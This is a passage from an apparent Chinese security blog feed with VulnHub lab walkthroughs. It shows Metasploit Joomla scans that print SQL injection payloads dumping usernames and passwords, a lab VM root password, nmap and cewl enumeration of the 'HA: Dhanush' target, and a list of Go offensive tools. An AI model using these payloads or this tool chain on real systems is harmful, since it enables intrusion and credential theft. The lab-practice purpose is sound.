class="line">var <span class="variable">$smtpsecure</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpport</span> = <span class="string">&#x27;25&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtpuser</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtppass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">var <span class="variable">$smtphost</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">/* Cache Settings */</span><br><span class="line">var <span class="variable">$caching</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$cachetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">var <span class="variable">$cache_handler</span> = <span class="string">&#x27;file&#x27;</span>;</span><br><span class="line">/* Meta Settings */</span><br><span class="line">var <span class="variable">$MetaDesc</span> = <span class="string">&#x27;Joomla! - the dynamic portal engine and content management system&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaKeys</span> = <span class="string">&#x27;joomla, Joomla&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaTitle</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">var <span class="variable">$MetaAuthor</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">/* SEO Settings */</span><br><span class="line">var <span class="variable">$sef</span>           = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$sef_rewrite</span>   = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">var <span class="variable">$sef_suffix</span>    = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">/* Feed Settings */</span><br><span class="line">var <span class="variable">$feed_limit</span>   = 10;</span><br><span class="line">var <span class="variable">$feed_email</span>   = <span class="string">&#x27;author&#x27;</span>;</span><br><span class="line">var <span class="variable">$log_path</span> = <span class="string">&#x27;/var/www/logs&#x27;</span>;</span><br><span class="line">var <span class="variable">$tmp_path</span> = <span class="string">&#x27;/var/www/tmp&#x27;</span>;</span><br><span class="line">/* Session Setting */</span><br><span class="line">var <span class="variable">$lifetime</span> = <span class="string">&#x27;15&#x27;</span>;</span><br><span class="line">var <span class="variable">$session_handler</span> = <span class="string">&#x27;database&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<p>账号密码为:root/yUtJklM97W</p>
<p>具体参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kZGQ0MWI4NDFjMzY=">phpmyadmin getshell<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li>使用msf中的auxiliary/scanner/http/joomla_plugins模块扫描</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">     .~+P``````-o+:.                                      -o+:.</span><br><span class="line">.+oooyysyyssyyssyddh++os-`````                        ```````````````          `</span><br><span class="line">+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o</span><br><span class="line">++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy</span><br><span class="line">--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///</span><br><span class="line">                                `...............`              `...-/////...`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                  .::::::::::-.                     .::::::-</span><br><span class="line">                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo</span><br><span class="line">                                 :Nm-/NMMMMMMMMMMMMM$<span class="variable">$NMMMMm</span>&amp;&amp;MMMMMMMMMMMMMMy</span><br><span class="line">                                 .sm/`-yMMMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMMMh`</span><br><span class="line">                                  -Nd`  :MMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMMh`</span><br><span class="line">                                   -Nh` .yMMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMMm/</span><br><span class="line">    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMm/</span><br><span class="line">      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$<span class="variable">$MMMMMN</span>&amp;&amp;MMMMMMMMMMd</span><br><span class="line">    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/</span><br><span class="line">    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:</span><br><span class="line">          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+</span><br><span class="line">          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::</span><br><span class="line">          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||</span><br><span class="line">........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........</span><br><span class="line">================================================================================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">=====================| Session one died of dysentery. |=========================</span><br><span class="line">=====================+--------------------------------+=========================</span><br><span class="line">================================================================================</span><br><span class="line"></span><br><span class="line">                     Press ENTER to size up the situation</span><br><span class="line"></span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span><br><span class="line">%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It<span class="string">&#x27;s always cool in the lab %%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string">%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                        Press SPACE BAR to continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.63-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use auxiliary/scanner/http/joomla_plugins</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; set RHOSTS 192.168.84.143</span></span><br><span class="line"><span class="string">RHOSTS =&gt; 192.168.84.143</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; set RPORT 666</span></span><br><span class="line"><span class="string">RPORT =&gt; 666</span></span><br><span class="line"><span class="string">msf5 auxiliary(scanner/http/joomla_plugins) &gt; exploit </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Plugin: /administrator/ </span></span><br><span class="line"><span class="string">[+] Plugin: /administrator/index.php?option=com_djartgallery&amp;task=editItem&amp;cid[]=1&#x27;</span>+and+1=1+--+ </span><br><span class="line">[+] Plugin: /administrator/index.php?option=com_searchlog&amp;act=<span class="built_in">log</span> </span><br><span class="line">[+] Plugin: /components/com_abc/ </span><br><span class="line">[+] Page: /index.php?option=com_abc</span><br><span class="line">[+] Plugin: /components/com_amblog/ </span><br><span class="line">[+] Page: /index.php?option=com_amblog</span><br><span class="line">[+] Plugin: /components/com_banners/ </span><br><span class="line">[+] Page: /index.php?option=com_banners</span><br><span class="line">[+] Plugin: /components/com_contact/ </span><br><span class="line">[+] Page: /index.php?option=com_contact</span><br><span class="line">[+] Plugin: /components/com_content/ </span><br><span class="line">[+] Page: /index.php?option=com_content</span><br><span class="line">[+] Plugin: /components/com_mailto/ </span><br><span class="line">[+] Plugin: /components/com_media/ </span><br><span class="line">[+] Plugin: /components/com_newsfeeds/ </span><br><span class="line">[+] Page: /index.php?option=com_newsfeeds</span><br><span class="line">[+] Plugin: /components/com_poll/ </span><br><span class="line">[+] Plugin: /components/com_search/ </span><br><span class="line">[+] Plugin: /components/com_user/ </span><br><span class="line">[+] Page: /index.php?option=com_user</span><br><span class="line">[+] Plugin: /components/com_user/controller.php </span><br><span class="line">[+] Plugin: /components/com_weblinks/ </span><br><span class="line">[+] Page: /index.php?option=com_weblinks</span><br><span class="line">[+] Plugin: /components/com_wrapper/ </span><br><span class="line">[+] Page: /index.php?option=com_wrapper</span><br><span class="line">[+] Plugin: /includes/joomla.php </span><br><span class="line">[+] Plugin: /index.php?option=com_abc&amp;view=abc&amp;letter=AS&amp;sectionid=<span class="string">&#x27; </span></span><br><span class="line"><span class="string">[+] Vulnerability: Potential SQL Injection</span></span><br><span class="line"><span class="string">[+] Plugin: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1 UNION SELECT @@version </span></span><br><span class="line"><span class="string">[+] Page: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1 UNION SELECT @@version</span></span><br><span class="line"><span class="string">[+] Plugin: /index.php?option=com_newsfeeds&amp;view=categories&amp;feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos_users-- </span></span><br><span class="line"><span class="string">[+] Page: /index.php?option=com_newsfeeds&amp;view=categories&amp;feedid=-1%20union%20select%201,concat%28username,char%2858%29,password%29,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%20from%20jos</span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/joomla/utilities/compat/php50x.php </span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/phpmailer/phpmailer.php </span></span><br><span class="line"><span class="string">[+] Plugin: /libraries/phpxmlrpc/xmlrpcs.php </span></span><br><span class="line"><span class="string">[+] Plugin: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/ </span></span><br><span class="line"><span class="string">[+] Plugin: /plugins/editors/xstandard/attachmentlibrary.php </span></span><br><span class="line"><span class="string">[+] Plugin: /templates/ja_purity/ </span></span><br><span class="line"><span class="string">[*] Scanned 1 of 1 hosts (100% complete)</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br></pre></td></tr></table></figure>

<p>发现存在注入漏洞,接下来sqlmap一波就行。</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>hack-with-golang-go-github-安全资源合集</title>
    <url>/2020/03/25/hack-with-golang/</url>
    <content><![CDATA[<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/coderain.gif"></li>
</ul>
<h3 id="批量ssh管理工具"><a href="#批量ssh管理工具" class="headerlink" title="批量ssh管理工具"></a>批量ssh管理工具</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9tdWx0aXNzaA==">multissh<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="Security-with-Go"><a href="#Security-with-Go" class="headerlink" title="Security-with-Go"></a>Security-with-Go</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9TZWN1cml0eS13aXRoLUdv">Security-with-Go<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="lcx在golang下的实现-内网穿透-端口转发工具"><a href="#lcx在golang下的实现-内网穿透-端口转发工具" class="headerlink" title="lcx在golang下的实现(内网穿透-端口转发工具)"></a>lcx在golang下的实现(内网穿透-端口转发工具)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9OQVRCeXBhc3M=">NATBypass<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="onionscan-暗网扫描器"><a href="#onionscan-暗网扫描器" class="headerlink" title="onionscan(暗网扫描器)"></a>onionscan(暗网扫描器)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9vbmlvbnNjYW4=">onionscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="goscan-交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化"><a href="#goscan-交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化" class="headerlink" title="goscan(交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化)"></a>goscan(交互式网络扫描客户端-具有自动完成功能-可通过nmap提供抽象和自动化)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb3NjYW4=">goscan<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Hacking-With-Golang-Golang安全资源合集"><a href="#Hacking-With-Golang-Golang安全资源合集" class="headerlink" title="Hacking-With-Golang(Golang安全资源合集)"></a>Hacking-With-Golang(Golang安全资源合集)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9IYWNraW5nLVdpdGgtR29sYW5n">Hacking-With-Golang<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="gocrack-GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。"><a href="#gocrack-GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。" class="headerlink" title="gocrack(GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。)"></a>gocrack(GoCrack提供了API-用于在受支持的破解引擎之间管理密码破解任务。)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb2NyYWNr">gocrack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="x-crack-多协议弱口令扫描器"><a href="#x-crack-多协议弱口令扫描器" class="headerlink" title="x-crack(多协议弱口令扫描器)"></a>x-crack(多协议弱口令扫描器)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci94LWNyYWNr">x-crack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="Hacking-with-Go-基于Gray-Black-Hat-Python-C-系列书籍"><a href="#Hacking-with-Go-基于Gray-Black-Hat-Python-C-系列书籍" class="headerlink" title="Hacking-with-Go(基于Gray/Black-Hat-Python/C#系列书籍)"></a>Hacking-with-Go(基于Gray/Black-Hat-Python/C#系列书籍)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9IYWNraW5nLXdpdGgtR28=">Hacking-with-Go<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="goHackTools-基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码"><a href="#goHackTools-基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码" class="headerlink" title="goHackTools(基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码)"></a>goHackTools(基于各种hack书籍的go-hack资源-俄罗斯hacker的go源码)</h3><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlci9nb0hhY2tUb29scw==">goHackTools<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h4 id="QQ-OR-微信"><a href="#QQ-OR-微信" class="headerlink" title="QQ OR 微信"></a>QQ OR 微信</h4><ul>
<li>1185151867</li>
<li>By Lucifer11 :)</li>
<li>Happy hacking!</li>
</ul>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>golang</tag>
        <tag>penetration tools</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[HA-Dhanush]</title>
    <url>/2019/12/17/HA-Dhanush/</url>
    <content><![CDATA[<p>名称：HA：Dhanush<br>发布日期：2019年11月9日</p>
<p>级别：中级<br>任务：枚举目标计算机并获得root用户访问权限。</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xQmZPdnJySXFrVmVlRWh2M2o3eUFTS21WTnctODRzM0wvdmlldz91c3A9c2hhcmluZw==">https://drive.google.com/file/d/1BfOvrrIqkVeeEhv3j7yASKmVNw-84s3L/view?usp=sharing<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcA==">https://download.vulnhub.com/ha/dhanush.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9oYS9kaGFudXNoLnppcC50b3JyZW50">https://download.vulnhub.com/ha/dhanush.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>Dhanush曾经是武器技术的巅峰之作。 它把战争重新定义到了一个新的高度，并在历史上的所有神话记载中都提到过。<br>选择你的Dhanush，拉伸琴弦并射击以获取root！枚举是关键！！！！有关印度神话和弓箭的一些信息可能会有所帮助。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.131</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">MAC Address: 00:0C:29:22:66:8B (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.131</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /images/: Potentially interesting directory w/ listing on <span class="string">&#x27;apache/2.4.29 (ubuntu)&#x27;</span></span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|     Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|_    Couldn&#x27;</span>t find a file-type field.</span><br><span class="line">| http-internal-ip-disclosure: </span><br><span class="line">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli <span class="keyword">for</span> queries:</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/js/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=S%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=N%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.142.131:80/assets/?C=D%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.142.131:80/assets/?C=M%3bO%3dA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">| vulners: </span></span><br><span class="line"><span class="string">|   cpe:/a:apache:http_server:2.4.29: </span></span><br><span class="line"><span class="string">|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211</span></span><br><span class="line"><span class="string">|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312</span></span><br><span class="line"><span class="string">|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715</span></span><br><span class="line"><span class="string">|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082</span></span><br><span class="line"><span class="string">|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217</span></span><br><span class="line"><span class="string">|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098</span></span><br><span class="line"><span class="string">|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081</span></span><br><span class="line"><span class="string">|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220</span></span><br><span class="line"><span class="string">|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196</span></span><br><span class="line"><span class="string">|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199</span></span><br><span class="line"><span class="string">|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333</span></span><br><span class="line"><span class="string">|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710</span></span><br><span class="line"><span class="string">|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197</span></span><br><span class="line"><span class="string">|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092</span></span><br><span class="line"><span class="string">|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763</span></span><br><span class="line"><span class="string">|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -A 192.168.142.131</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: HA: Dhanush</span><br><span class="line">65345/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 e3:2f:3d:dd:ac:42:d4:d5:de:ec:9b:19:0b:45:3e:13 (RSA)</span><br><span class="line">|   256 89:02:8d:a5:e0:75:a5:34:3b:52:3a:6c:d1:f4:05:da (ECDSA)</span><br><span class="line">|_  256 ea:af:62:07:73:d0:d5:1e:fb:a9:12:62:34:27:52:d9 (ED25519)</span><br></pre></td></tr></table></figure>

<p>现在，在进一步之前，此网页可能包含Dhanush的大量信息。 同样，这些可能是用户名或密码。 因此，决定使用cewl命令制作字典。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl http://192.168.142.131/ -w dict1.txt</span></span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@kali:~<span class="comment"># cat dict1.txt </span></span><br><span class="line">Dhanush</span><br><span class="line">धनष</span><br><span class="line">Lord</span><br><span class="line">Feature</span><br><span class="line">Wielded</span><br><span class="line">the</span><br><span class="line">यद</span><br><span class="line">यग</span><br><span class="line">Arjuna</span><br><span class="line">was</span><br><span class="line">able</span><br><span class="line">his</span><br><span class="line">and</span><br><span class="line">Then</span><br><span class="line">path</span><br><span class="line">The</span><br><span class="line">Header</span><br><span class="line">लनर</span><br><span class="line">भवत</span><br><span class="line">भरत</span><br><span class="line">यत</span><br><span class="line">थनमधर</span><br><span class="line">तदत</span><br><span class="line">मन</span><br><span class="line">सजम</span><br><span class="line">यहम</span><br><span class="line">परत</span><br><span class="line">रणय</span><br><span class="line">सधन</span><br><span class="line">वनशय</span><br><span class="line">दष</span><br><span class="line">कतम</span><br><span class="line">मसस</span><br><span class="line">थपनर</span><br><span class="line">थय</span><br><span class="line">भवम</span><br><span class="line">What</span><br><span class="line">Banner</span><br><span class="line">Dhanushधनष</span><br><span class="line">Weapon</span><br><span class="line"><span class="keyword">for</span></span><br><span class="line">shooting</span><br><span class="line">arrows</span><br><span class="line">typically</span><br><span class="line">made</span><br><span class="line">curved</span><br><span class="line">piece</span><br><span class="line">wood</span><br><span class="line">joined</span><br><span class="line">both</span><br><span class="line">ends</span><br><span class="line">Taut</span><br><span class="line">String</span><br><span class="line">दनय</span><br><span class="line">सबस</span><br><span class="line">तशल</span><br><span class="line">धनषWorld</span><br><span class="line">Most</span><br><span class="line">Powerful</span><br><span class="line">Dhanushs</span><br><span class="line">Sharang</span><br><span class="line">Dhanushसरग</span><br><span class="line">Vishnu</span><br><span class="line">Made</span><br><span class="line">Viswakarma</span><br><span class="line">Pinak</span><br><span class="line">Dhanushपनक</span><br><span class="line">ShivaMade</span><br><span class="line">pinak</span><br><span class="line">Gandiv</span><br><span class="line">Dhanushगण</span><br><span class="line">डव</span><br><span class="line">ArjunaMade</span><br><span class="line">Brahma</span><br><span class="line">Portfolio</span><br><span class="line">Choose</span><br><span class="line">Yoursअपन</span><br><span class="line">चन</span><br><span class="line">Heat</span><br><span class="line">Mahabharata</span><br><span class="line">not</span><br><span class="line">lift</span><br><span class="line">against</span><br><span class="line">Family</span><br><span class="line">Gurus</span><br><span class="line">Krishna</span><br><span class="line">tells</span><br><span 